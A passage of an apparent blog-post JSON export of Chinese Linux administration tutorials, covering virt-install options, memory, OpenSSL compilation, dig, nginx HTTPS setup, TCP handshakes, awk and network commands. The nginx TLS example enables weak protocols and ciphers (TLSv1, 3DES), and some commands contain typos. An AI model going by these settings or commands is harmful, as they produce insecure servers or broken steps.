guest. Graphics Configuration: --graphics=GRAPHICS Configure guest display settings. Ex: --graphics vnc --graphics spice,port=5901,tlsport=5902 --graphics none --graphics vnc,password=foobar,port=5910,keymap=ja --noautoconsole Don&apos;t automatically try to connect to the guest console Device Options: --serial=SERIALS Configure a guest serial device --parallel=PARALLELS Configure a guest parallel device --channel=CHANNELS Configure a guest communication channel --console=CONSOLES Configure a text console connection between the guest and host --host-device=HOSTDEVS Configure physical host devices attached to the guest --soundhw=SOUNDHW Configure guest sound device emulation --watchdog=WATCHDOG Configure a guest watchdog device --video=VIDEO Configure guest video hardware. --smartcard=SMARTCARD Configure a guest smartcard device. Ex: --smartcard mode=passthrough --redirdev=REDIRDEV Configure a guest redirection device. Ex: --redirdev usb,type=tcp,server=192.168.1.1:4000 --panic=PANIC Configure a guest panic device. Ex: --panic default Virtualization Platform Options: -v, --hvm This guest should be a fully virtualized guest -p, --paravirt This guest should be a paravirtualized guest --container This guest should be a container guest --virt-type=HV_TYPE Hypervisor name to use (kvm, qemu, xen, ...) --arch=ARCH The CPU architecture to simulate --machine=MACHINE The machine type to emulate --noapic Disables APIC for fully virtualized guest (overrides value in os-type/os-variant db) --noacpi Disables ACPI for fully virtualized guest (overrides value in os-type/os-variant db) -u UUID, --uuid=UUID UUID for the guest. Miscellaneous Options: --autostart Have domain autostart on host boot up. --print-xml Print the generated domain XML rather than define the guest. --print-step=XMLSTEP Print XML of a specific install step (1, 2, 3, all) rather than define the guest. --noreboot Don&apos;t boot guest after completing install. --wait=WAIT Time to wait (in minutes) --dry-run Run through install process, but do not create devices or define the guest. --force Forces &apos;yes&apos; for any applicable prompts, terminates for all others -q, --quiet Suppress non-error output --prompt Request user input for ambiguous situations or required options. -d, --debug Print debugging information","categories":[],"tags":[{"name":"KVM","slug":"KVM","permalink":"https://awen.me/tags/KVM/"},{"name":"虚拟化","slug":"虚拟化","permalink":"https://awen.me/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"}]},{"title":"Linux 的内存管理机制","slug":"Linux-的内存管理机制","date":"2017-06-14T12:00:32.000Z","updated":"2021-02-26T06:05:29.257Z","comments":true,"path":"posts/2110698754.html","link":"","permalink":"https://awen.me/posts/2110698754.html","excerpt":"在使用 linux 的时候，我们经常发现系统的空闲内存差不多总是被用完了。 我们可以通过 top 和 free 查看内存使用情况","text":"在使用 linux 的时候，我们经常发现系统的空闲内存差不多总是被用完了。 我们可以通过 top 和 free 查看内存使用情况 Windows 和 linux 的 内存分配区别但是，事实真的是内存被用完了吗，要了解这个问题，我们需要了解 linux 的内存分配管理机制，在 linux 中为了充分发挥和利益可用的内存空间，linux 会把一些程序调用过的硬盘数据写入内存，利用内存的读写高速的特性提高 linux 系统的数据访问性能。这恰恰是 linux 内存管理的高明之处。 那么我们看下 Windows，Windows 操作系统的内存是只有当使用的时候，才会分配内存，这就导致你有4个 g 内存，但是实际只用了2个 g，而剩下的2个 g 就一直处于空闲状态，而linux 则将所有的内存都利用起来。 linux 的这个特性，主要是把物理内存划分出一部分的空间，我们称作 cache/buffers，以此来提高数据的访问性能，页面的缓存（cahce）是 linux 内核实现的一种主要磁盘缓存。主要用来减少对磁盘 I/O 的操作。 fwj@ubuntu:~$ free -h total used free shared buff/cache available Mem: 1.9G 63M 1.3G 8.5M 531M 1.7G Swap: 2.0G 0B 2.0Gfree 可以查看 当前的内存使用情况 纵向的 total 表示内存总大小 used 表示已使用的物理内存大小 free 表示空闲的内存大小 shared 表示多个进程共享的内存大小 buffers/cached 表示磁盘缓存的大小 横向的 第一行 men 表示物理内存 第二行表示 swap 交换分区的使用情况。 使用-s参数我们可以指定每3秒显示一次知道你退出终端，加上-c参数设置多少次退出。 $ free -s 3 -c 5 total used free shared buffers cached Mem: 1018332 588736 429596 608 101768 192548 -/+ buffers/cache: 294420 723912 Swap: 0 0 0 total used free shared buffers cached Mem: 1018332 588752 429580 608 101768 192548 -/+ buffers/cache: 294436 723896 Swap: 0 0 0显示最高和最低的内存使用情况 $ free -l total used free shared buffers cached Mem: 1018332 590908 427424 608 101852 192596 Low: 1018332 590908 427424 High: 0 0 0 -/+ buffers/cache: 296460 721872 Swap: 0 0 0 ## 虚拟内存 Windows 也有虚拟内存的概念，而在 linux 中，叫 swap---交换分区，我们都知道物理内存就是真实的内存条上标识的硬件，那么虚拟内存是为了满足物理内存不足的情况而设计的，它其实是利用磁盘空间虚拟出来的一块逻辑内存，作为物理内存的扩展，操作系统会在物理内存不足的时候使用交换分区的虚拟内存，内核暂时不会用内存信息写到交换空间，从而保证物理内存的空间得到释放，通常 swap 的大小设置的是（物理内存大小X2倍）。","categories":[],"tags":[{"name":"内存管理","slug":"内存管理","permalink":"https://awen.me/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"}]},{"title":"又拍云制作带有马赛克背景的图片","slug":"又拍云制作带有马赛克背景的图片","date":"2017-06-14T11:59:44.000Z","updated":"2021-02-26T06:05:29.319Z","comments":true,"path":"posts/3201334077.html","link":"","permalink":"https://awen.me/posts/3201334077.html","excerpt":"制作前提1.首先马赛克背景的图片要比打上去的图片尺寸大2.需要打上去的图片必须是 png 格式3.图片必须在同一个服务下","text":"制作前提1.首先马赛克背景的图片要比打上去的图片尺寸大2.需要打上去的图片必须是 png 格式3.图片必须在同一个服务下 步骤1.背景图 2.原图 3.制作后的图 制作参数 http://file.awen.me/masaike.jpg!awen)!/watermark/url/L3BuZy5wbmcucG5n/align/center","categories":[],"tags":[{"name":"又拍云","slug":"又拍云","permalink":"https://awen.me/tags/%E5%8F%88%E6%8B%8D%E4%BA%91/"}]},{"title":"centos 编译OpenSSL","slug":"centos-编译OpenSSL","date":"2017-06-14T11:58:58.000Z","updated":"2021-02-26T06:05:29.271Z","comments":true,"path":"posts/2183700772.html","link":"","permalink":"https://awen.me/posts/2183700772.html","excerpt":"编译过程1、从下列页面下载最新的OpenSSL http://openssl.org/source/","text":"编译过程1、从下列页面下载最新的OpenSSL http://openssl.org/source/ 2、解压编译 wget -c https://www.openssl.org/source/openssl-1.0.2j.tar.gz tar zxvf openssl-1.0.2j.tar.gz cd openssl-1.0.2j ./config make make install2、执行以下命令： mv /usr/bin/openssl /usr/bin/openssl.OFF mv /usr/include/openssl /usr/include/openssl.OFF ln –s /usr/local/ssl/bin/openssl /usr/bin/openssl ln –s /usr/local/ssl/include/openssl /usr/include/openssl 3 配置库文件搜索路径 #echo “/usr/local/ssl/lib” &gt;&gt; /etc/ld.so.conf.d/ssl.conf #ldconfig 4 查看openssl 版本号，验证安装正确性","categories":[],"tags":[{"name":"openssl","slug":"openssl","permalink":"https://awen.me/tags/openssl/"}]},{"title":"dig 详解","slug":"dig-详解","date":"2017-06-14T11:58:10.000Z","updated":"2021-02-26T06:05:29.272Z","comments":true,"path":"posts/3084772776.html","link":"","permalink":"https://awen.me/posts/3084772776.html","excerpt":"dig命令是一个 dns 查询工具，类似的还有 nsllokup，nslookup 可以在 Windows 和 unix/Linux 上使用，而dig 只能在 unix/linux 上使用。dig是一个缩写其实是一个缩写，即Domain Information Groper","text":"dig命令是一个 dns 查询工具，类似的还有 nsllokup，nslookup 可以在 Windows 和 unix/Linux 上使用，而dig 只能在 unix/linux 上使用。dig是一个缩写其实是一个缩写，即Domain Information Groper 用法dig --help Invalid option: --help Usage: dig [@global-server] [domain] [q-type] [q-class] {q-opt} {global-d-opt} host [@local-server] {local-d-opt} [ host [@local-server] {local-d-opt} [...]] Use &quot;dig -h&quot; (or &quot;dig -h | more&quot;) for complete list of options 用法：dig @dnsserver name querytype 如果你直接 dig 后回车，得到的信息类似如下，在不带任何参数和选项的时候，dig 会向默认的上连 dns 服务器查询.（根域名）的 NS 记录。 # dig ; &lt;&lt;&gt;&gt; DiG 9.8.2rc1-RedHat-9.8.2-0.47.rc1.el6_8.4 &lt;&lt;&gt;&gt; ;; global options: +cmd ;; Got answer: ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 52702 ;; flags: qr rd ra; QUERY: 1, ANSWER: 13, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION: ;. IN NS ;; ANSWER SECTION: . 261640 IN NS k.root-servers.net. . 261640 IN NS f.root-servers.net. . 261640 IN NS j.root-servers.net. . 261640 IN NS l.root-servers.net. . 261640 IN NS a.root-servers.net. . 261640 IN NS h.root-servers.net. . 261640 IN NS g.root-servers.net. . 261640 IN NS c.root-servers.net. . 261640 IN NS i.root-servers.net. . 261640 IN NS d.root-servers.net. . 261640 IN NS m.root-servers.net. . 261640 IN NS b.root-servers.net. . 261640 IN NS e.root-servers.net. ;; Query time: 12 msec ;; SERVER: 223.5.5.5#53(223.5.5.5) ;; WHEN: Wed Mar 15 18:48:35 2017 ;; MSG SIZE rcvd: 228dig 加个点# dig . ; &lt;&lt;&gt;&gt; DiG 9.8.2rc1-RedHat-9.8.2-0.47.rc1.el6_8.4 &lt;&lt;&gt;&gt; . ;; global options: +cmd ;; Got answer: ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 8445 ;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 0 ;; QUESTION SECTION: ;. IN A ;; AUTHORITY SECTION: . 1603 IN SOA a.root-servers.net. nstld.verisign-grs.com. 2017031500 1800 900 604800 86400 ;; Query time: 12 msec ;; SERVER: 223.5.5.5#53(223.5.5.5) ;; WHEN: Wed Mar 15 18:50:57 2017 ;; MSG SIZE rcvd: 92查询某个域名的解析记录➜ ~ dig awen.me ; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; awen.me ;; global options: +cmd ;; Got answer: ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 58893 ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION: ;awen.me. IN A ;; ANSWER SECTION: awen.me. 600 IN A 121.42.148.64 ;; Query time: 87 msec ;; SERVER: 223.5.5.5#53(223.5.5.5) ;; WHEN: Wed Mar 15 18:41:46 2017 ;; MSG SIZE rcvd: 41指定 dns 查询对比上面的，我们看下SERVER: 223.5.5.5#53(223.5.5.5)变成了114的 dns。 # dig @114.114.114.114 www.awen.me ; &lt;&lt;&gt;&gt; DiG 9.8.2rc1-RedHat-9.8.2-0.47.rc1.el6_8.4 &lt;&lt;&gt;&gt; @114.114.114.114 www.awen.me ; (1 server found) ;; global options: +cmd ;; Got answer: ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 39643 ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION: ;www.awen.me. IN A ;; ANSWER SECTION: www.awen.me. 600 IN A 121.42.148.64 ;; Query time: 822 msec ;; SERVER: 114.114.114.114#53(114.114.114.114) ;; WHEN: Wed Mar 15 18:52:58 2017 ;; MSG SIZE rcvd: 45批量查询我们把需要查询的域名信息写入文件文件，查询时候使用 -f 参数指定文件 # cat test.txt www.baidu.com www.youku.com www.upyun.com然后 dig -f test.txt 指定使用ipv4还是ipv6查询dig -4 domain or dig -6 domain使用-t 参数查询其他 dns 类型 查询邮件解析# dig qq.com -t MX ; &lt;&lt;&gt;&gt; DiG 9.8.2rc1-RedHat-9.8.2-0.47.rc1.el6_8.4 &lt;&lt;&gt;&gt; qq.com -t MX ;; global options: +cmd ;; Got answer: ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 35044 ;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION: ;qq.com. IN MX ;; ANSWER SECTION: qq.com. 7200 IN MX 10 mx3.qq.com. qq.com. 7200 IN MX 20 mx2.qq.com. qq.com. 7200 IN MX 30 mx1.qq.com. ;; Query time: 472 msec ;; SERVER: 223.5.5.5#53(223.5.5.5) ;; WHEN: Wed Mar 15 18:58:02 2017 ;; MSG SIZE rcvd: 84-x 参数逆向查询选项。可以查询IP地址到域名的映射关系。 dig -x 121.42.148.64 ; &lt;&lt;&gt;&gt; DiG 9.8.2rc1-RedHat-9.8.2-0.47.rc1.el6_8.4 &lt;&lt;&gt;&gt; -x 121.42.148.64;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NXDOMAIN, id: 17255;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION:;64.148.42.121.in-addr.arpa. IN PTR ;; Query time: 533 msec;; SERVER: 223.5.5.5#53(223.5.5.5);; WHEN: Wed Mar 15 18:59:21 2017;; MSG SIZE rcvd: 44 指定协议查询还可以使用 tcp 查询，默认是 udp dig +tcp domain递归查询 dns 解析 dig +trcae domain例如： ➜ ~ dig +trace awen.me ; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; +trace awen.me ;; global options: +cmd . 396 IN NS j.root-servers.net. . 396 IN NS b.root-servers.net. . 396 IN NS d.root-servers.net. . 396 IN NS i.root-servers.net. . 396 IN NS m.root-servers.net. . 396 IN NS h.root-servers.net. . 396 IN NS e.root-servers.net. . 396 IN NS g.root-servers.net. . 396 IN NS l.root-servers.net. . 396 IN NS c.root-servers.net. . 396 IN NS f.root-servers.net. . 396 IN NS a.root-servers.net. . 396 IN NS k.root-servers.net. ;; Received 228 bytes from 223.5.5.5#53(223.5.5.5) in 676 ms me. 415 IN NS ns.nic.me. me. 415 IN NS c0.cctld.afilias-nst.info. me. 415 IN NS a2.me.afilias-nst.info. me. 415 IN NS d0.cctld.afilias-nst.org. me. 415 IN NS b2.me.afilias-nst.org. me. 415 IN NS a0.cctld.afilias-nst.info. me. 415 IN NS ns2.nic.me. me. 415 IN NS b0.cctld.afilias-nst.org. ;; Received 511 bytes from 198.41.0.4#53(198.41.0.4) in 1094 ms …… 省略很多，太长了 me. 414 IN NS ns2.nic.me. me. 414 IN NS a0.cctld.afilias-nst.info. me. 414 IN NS b2.me.afilias-nst.org. me. 414 IN NS b0.cctld.afilias-nst.org. me. 414 IN NS ns.nic.me. me. 414 IN NS c0.cctld.afilias-nst.info. me. 414 IN NS a2.me.afilias-nst.info. me. 414 IN NS d0.cctld.afilias-nst.org. ;; BAD (HORIZONTAL) REFERRAL dig: too many lookups使用+short 只输出很短的信息 dig +short awen.me 121.42.148.64查询 NS 信息➜ wwwroot dig NS awen.me ; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; NS awen.me ;; global options: +cmd ;; Got answer: ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 5760 ;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION: ;awen.me. IN NS ;; ANSWER SECTION: awen.me. 605 IN NS dns9.hichina.com. awen.me. 605 IN NS dns10.hichina.com. ;; Query time: 34 msec ;; SERVER: 223.5.5.5#53(223.5.5.5) ;; WHEN: Thu Jul 6 17:27:02 2017 ;; MSG SIZE rcvd: 75","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"},{"name":"DNS","slug":"DNS","permalink":"https://awen.me/tags/DNS/"}]},{"title":"接入又拍云CDN 配置HTTPS 出现访问无法加载js css文件的解决办法","slug":"接入又拍云CDN-配置HTTPS-出现访问无法加载js-css文件的解决办法","date":"2017-06-14T11:57:10.000Z","updated":"2021-02-26T06:05:29.339Z","comments":true,"path":"posts/1904498248.html","link":"","permalink":"https://awen.me/posts/1904498248.html","excerpt":"配置SSL出现访问无法加载图片和js css的解决办法1.在UPYUN 配置HTTPS后，申请的免费SSL，出现访问源站控制台报错","text":"配置SSL出现访问无法加载图片和js css的解决办法1.在UPYUN 配置HTTPS后，申请的免费SSL，出现访问源站控制台报错 解决办法这种问题是因为开启了HTTPS 但是网站内的一些链接还是HTTP而导致的，因此需要把网页内的链接替换为HTTPS即可。 这里给一个思路，我这里以源站NGINX为例 开启443端口并且开启SSL，配置证书 可以参考如下配置 listen 443 ssl http2 default_server; server_name www.awen.me awen.me; index index.html index.htm index.php; root /data/wwwroot; //主要是这里 ssl on; ssl_certificate /etc/letsencrypt/live/awen.me/fullchain.pem; //加载公钥 ssl_certificate_key /etc/letsencrypt/live/awen.me/privkey.pem;//加载私钥 ssl_ciphers EECDH+CHACHA20:EECDH+CHACHA20-draft:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5; ssl_prefer_server_ciphers on; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_session_cache shared:SSL:50m; ssl_session_timeout 1d; ssl_session_tickets on; resolver 114.114.114.114 valid=300s; resolver_timeout 10s; add_header Strict-Transport-Security &quot;max-age=31536000&quot;; add_header X-Frame-Options deny; add_header X-Content-Type-Options nosniff;如果有开启iptables，需要放行443的数据包，例如 iptables -A INPUT -p tcp --dport 443 -j ACCEPT然后在又拍云后台 找到对应服务，配置回源为HTTPS协议回源或协议跟随 如何申请证书1.申请let’s encrypt 参考https://certbot.eff.org/ 选择对应的web服务器和操作系统 ![33434.png][3] 3.安装程序，例如我这里是centos6.8 wget https://dl.eff.org/certbot-auto chmod a+x certbot-auto mv certbot-auto /usr/bin/certbot4.运行以下命令申请 certbot certonly --standalone -d example.com -d www.example.com # example为你的域名 注意：申请证书需要注意 对应的端口例如80 443不能被占用，此外，需要做好域名解析，一般为A记录到你申请证书的服务器，certbot-auto 需要通过DNS解析值判断该域名的所有者是你本人 5.申请完证书，没有报错的话，会保存在etc/letsencrypt/live/ 下 # cd /etc/letsencrypt/live/awen.me/ # ls cert.pem chain.pem fullchain.pem privkey.pem将fullchain 和privkey 的路径加载到nginx中即可","categories":[],"tags":[{"name":"又拍云","slug":"又拍云","permalink":"https://awen.me/tags/%E5%8F%88%E6%8B%8D%E4%BA%91/"}]},{"title":"tcp 三次握手 四次挥手","slug":"tcp-三次握手-四次挥手","date":"2017-06-14T11:56:21.000Z","updated":"2021-02-26T06:05:29.292Z","comments":true,"path":"posts/634402417.html","link":"","permalink":"https://awen.me/posts/634402417.html","excerpt":"","text":"三次握手—建立连接首先Client端发送连接请求报文，Server段接受连接后回复ACK报文，并为这次连接分配资源。Client端接收到ACK报文后也向Server段发生ACK报文，并分配资源，这样TCP连接就建立了。 四次挥手—断开连接假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说”我Client端没有数据要发给你了”，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，”告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，”告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，”就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。“，Server端收到ACK后，”就知道可以断开连接了”。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了！ ![2222.gif][2] 【问题1】为什么连接的时候是三次握手，关闭的时候却是四次握手？答：因为当Server端收到Client端的SYN连接请求报文后，可以直接发送SYN+ACK报文。其中ACK报文是用来应答的，SYN报文是用来同步的。但是关闭连接时，当Server端收到FIN报文时，很可能并不会立即关闭SOCKET，所以只能先回复一个ACK报文，告诉Client端，”你发的FIN报文我收到了”。只有等到我Server端所有的报文都发送完了，我才能发送FIN报文，因此不能一起发送。故需要四步握手。【问题2】为什么TIME_WAIT状态需要经过2MSL(最大报文段生存时间)才能返回到CLOSE状态？答：虽然按道理，四个报文都发送完毕，我们可以直接进入CLOSE状态了，但是我们必须假象网络是不可靠的，有可以最后一个ACK丢失。所以TIME_WAIT状态就是用来重发可能丢失的ACK报文。","categories":[],"tags":[{"name":"tcp","slug":"tcp","permalink":"https://awen.me/tags/tcp/"}]},{"title":"文本处理三剑客之 awk","slug":"文本处理三剑客之-awk","date":"2017-06-14T11:55:49.000Z","updated":"2021-02-26T06:05:29.341Z","comments":true,"path":"posts/2148045944.html","link":"","permalink":"https://awen.me/posts/2148045944.html","excerpt":"在 linux 或 *nix 中 awk 、sed、grep 统称为文本处理三剑客。 awkawk是一个强大的文本分析工具，相对于grep的查找，sed的编辑，awk在其对数据分析并生成报告时，显得尤为强大。简单来说awk就是把文件逐行的读入，以空格为默认分隔符将每行切片，切开的部分再进行各种分析处理。 awk有3个不同版本: awk、nawk和gawk，未作特别说明，一般指gawk，gawk 是 AWK 的 GNU 版本。","text":"在 linux 或 *nix 中 awk 、sed、grep 统称为文本处理三剑客。 awkawk是一个强大的文本分析工具，相对于grep的查找，sed的编辑，awk在其对数据分析并生成报告时，显得尤为强大。简单来说awk就是把文件逐行的读入，以空格为默认分隔符将每行切片，切开的部分再进行各种分析处理。 awk有3个不同版本: awk、nawk和gawk，未作特别说明，一般指gawk，gawk 是 AWK 的 GNU 版本。 awk其名称得自于它的创始人 Alfred Aho 、Peter Weinberger 和 Brian Kernighan 姓氏的首个字母。实际上 AWK 的确拥有自己的语言： AWK 程序设计语言 ， 三位创建者已将它正式定义为“样式扫描和处理语言”。它允许您创建简短的程序，这些程序读取输入文件、为数据排序、处理数据、对输入执行计算以及生成报表，还有无数其他的功能。 使用awk 其实是 gawk 的一个连接 [root@OpenStack ~]# which awk /bin/awk [root@OpenStack ~]# cd /bin/ [root@OpenStack bin]# ll awk lrwxrwxrwx. 1 root root 4 3月 14 19:39 awk -&gt; gawk用法 awk [options] &apos;program&apos; {filenames} program格式：’{pattern + action}’ 语句之间用分号分割 选项： -F 指明输入时用到的字段分隔符 -v 用于实现自定义变量，格式：var=value ##awk 的实现方式awk 会把需要处理的文本进行切片，切割成片段后 可以使用$1-$n 的方式来显示切割后的行，第一行为$1，第二行为$2，以此类推，全文输入则使用$0，此外，处理完毕后，我们还可以加入条件判断，总的来说 awk 其实也是一门编程语言。 1.打印第一行 [root@OpenStack bin]# awk &apos;{print $1}&apos; /etc/fstab 我们可以使用 print 输出某行，格式是print item1,item2,… 2.打印多行 [root@OpenStack bin]# awk &apos;{print $1,$3}&apos; /etc/passwd","categories":[],"tags":[{"name":"awk","slug":"awk","permalink":"https://awen.me/tags/awk/"}]},{"title":"Linux 中和网络相关的一些命令","slug":"Linux-中和网络相关的一些命令","date":"2017-06-14T11:55:01.000Z","updated":"2021-02-26T06:05:29.254Z","comments":true,"path":"posts/2983387278.html","link":"","permalink":"https://awen.me/posts/2983387278.html","excerpt":"##ifconfig","text":"##ifconfig 查IP [root@node-lvs-master vimrc]# ifconfig eth0 Link encap:Ethernet HWaddr 00:0C:29:8C:65:5C inet addr:192.168.1.100 Bcast:192.168.1.255 Mask:255.255.255.0 分别是IP地址 广播号 子网掩码 inet6 addr: fe80::20c:29ff:fe8c:655c/64 Scope:Link ##IPV6的地址 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 MTU值，度量值 RX packets:4442 errors:0 dropped:0 overruns:0 frame:0 ##数据包收发状态 TX packets:3023 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:477890 (466.6 KiB) TX bytes:778624 (760.3 KiB) ##数据包收发总量 eth1 Link encap:Ethernet HWaddr 00:50:56:26:3F:BF inet addr:10.2.100.128 Bcast:10.2.100.255 Mask:255.255.255.0 inet6 addr: fe80::250:56ff:fe26:3fbf/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:18456 errors:0 dropped:0 overruns:0 frame:0 TX packets:9730 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:27076657 (25.8 MiB) TX bytes:587726 (573.9 KiB) lo Link encap:Local Loopback ##回环地址 inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:0 (0.0 b) TX bytes:0 (0.0 b)telnet[root@node-lvs-master vimrc]# yum -y install telnet测试端口通与不同 [root@node-lvs-master vimrc]# telnet 121.42.148.64 443 Trying 121.42.148.64... Connected to 121.42.148.64. Escape character is &apos;^]&apos;. ^C^Z^CConnection closed by foreign host. [root@node-lvs-master vimrc]# ^C [root@node-lvs-master vimrc]# telnet 121.42.148.64 445 Trying 121.42.148.64... telnet: connect to address 121.42.148.64: Connection refusednetstat描述：打印网络连接 路由表 网络接口的统计信息 参数 -s 显示各种协议数据统计信息 -n 把IP\\端口\\用户的ID、替换为主机 协议 用户名等信息-p 显示进程名称和进程号-l 仅仅显示正在监听的sockets接口信息-u udp-t tcp [root@node-lvs-master vimrc]# netstat -nutlp Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:65422 0.0.0.0:* LISTEN 1319/sshd tcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN 1398/master tcp 0 0 :::65422 :::* LISTEN 1319/sshd tcp 0 0 ::1:25 :::* LISTEN 1398/master Recv-Q 接收Send-Q 发送 [root@node-lvs-master vimrc]# netstat -s Ip: 22984 total packets received 0 forwarded 0 incoming packets discarded 22975 incoming packets delivered 12881 requests sent out Icmp: 0 ICMP messages received 0 input ICMP message failed. ICMP input histogram: 0 ICMP messages sent 0 ICMP messages failed ICMP output histogram: Tcp: 8 active connections openings 1 passive connection openings 1 failed connection attempts 1 connection resets received 1 connections established 22488 segments received 12846 segments send out 1 segments retransmited 0 bad segments received. 9 resets sent Udp: 34 packets received 0 packets to unknown port received. 0 packet receive errors 34 packets sent UdpLite: TcpExt: 6 TCP sockets finished time wait in fast timer 68 delayed acks sent 19048 packets header predicted 1211 acknowledgments not containing data received 968 predicted acknowledgments 0 TCP data loss events 1 other TCP timeouts IpExt: InNoRoutes: 9 InBcastPkts: 453 InOctets: 27316909 OutOctets: 1160990ss和netstat差不多 [root@node-lvs-master vimrc]# ss -anut Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port tcp LISTEN 0 128 :::65422 :::* tcp LISTEN 0 128 *:65422 *:* tcp LISTEN 0 100 ::1:25 :::* tcp LISTEN 0 100 127.0.0.1:25 *:* tcp ESTAB 0 96 192.168.1.100:65422 192.168.1.241:64743 route路由相关设置和查看 [root@node-lvs-master vimrc]# route Kernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface 10.2.100.0 * 255.255.255.0 U 0 0 0 eth1 192.168.1.0 * 255.255.255.0 U 0 0 0 eth0 link-local * 255.255.0.0 U 1002 0 0 eth0 link-local * 255.255.0.0 U 1003 0 0 eth1 default 10.2.100.2 0.0.0.0 UG 0 0 0 eth1网卡设置1.编辑配置文件 [root@node-lvs-master vimrc]# vim /etc/sysconfig/network-scripts/ifcfg-eth0 DEVICE=eth0 TYPE=Ethernet UUID=82fc9357-d760-4986-8e1d-c7aef84dd2dd ONBOOT=yes NM_CONTROLLED=yes BOOTPROTO=static HWADDR=00:0C:29:8C:65:5C IPADDR=192.168.1.100 PREFIX=24 GATEWAY=192.168.1.1 DNS1=192.168.1.1 DNS2= 114.114.114.114 DEFROUTE=yes IPV4_FAILURE_FATAL=yes IPV6INIT=no NAME=&quot;System eth0&quot;2.dns的修改 [fangwenjun@CTN-QD-247 ~]$ cat /etc/resolv.conf options timeout:1 attempts:1 rotate nameserver 223.5.5.5 nameserver 223.6.6.6traceroute查看路由转发的路由表信息，默认使用UDP协议 -I 可以用icmp发送 [root@node-lvs-master ~]# traceroute ipdighost nslookup 等需要安装，默认最小化安装操作系统没有 安装 yum install bind-utilsyum install bind-utils 2.使用 [root@node-lvs-master ~]# dig awen.me ; &lt;&lt;&gt;&gt; DiG 9.8.2rc1-RedHat-9.8.2-0.47.rc1.el6_8.3 &lt;&lt;&gt;&gt; awen.me ;; global options: +cmd ;; Got answer: ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 61333 ;; flags: qr rd ra; QUERY: 1, ANSWER: 6, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION: ;awen.me. IN A ;; ANSWER SECTION: awen.me. 600 IN CNAME fangwenjun.b0.aicdn.com. fangwenjun.b0.aicdn.com. 1497 IN CNAME ctn.b9.aicdn.com. ctn.b9.aicdn.com. 60 IN A 183.158.35.58 ctn.b9.aicdn.com. 60 IN A 183.158.35.57 ctn.b9.aicdn.com. 60 IN A 183.158.35.59 ctn.b9.aicdn.com. 60 IN A 183.158.35.60 ;; Query time: 30 msec ;; SERVER: 192.168.1.1#53(192.168.1.1) ;; WHEN: Sat Jan 7 10:42:31 2017 ;; MSG SIZE rcvd: 1472.@可以跟dns，可以判断解析是否生效 [root@node-lvs-master ~]# dig awen.me @8.8.8.83.查看邮件解析 [root@node-lvs-master ~]# dig fangwenjun.com MX ; &lt;&lt;&gt;&gt; DiG 9.8.2rc1-RedHat-9.8.2-0.47.rc1.el6_8.3 &lt;&lt;&gt;&gt; fangwenjun.com MX ;; global options: +cmd ;; Got answer: ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 36288 ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION: ;fangwenjun.com. IN MX ;; ANSWER SECTION: fangwenjun.com. 600 IN MX 10 